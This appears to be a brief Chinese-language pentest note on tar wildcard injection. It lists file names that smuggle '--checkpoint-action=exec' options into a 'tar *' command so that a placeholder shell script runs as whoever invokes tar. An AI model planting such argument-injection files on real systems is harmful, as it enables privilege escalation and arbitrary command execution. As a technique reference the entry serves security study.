# TAR命令执行
通过使用检查点操作的tar选项,在检查点之后可以使用指定的操作. 该操作可能是一个恶意的shell脚本，它可以用于在启动tar的用户下执行任意命令. “欺骗”根来使用特定的选项非常简单,这就是通配符的用武之地.	

## 开发

这些文件针对的是"tar *"
```
--checkpoint=1
--checkpoint-action=exec=sh shell.sh
shell.sh   (your exploit code is here)
```

## 致谢
* 


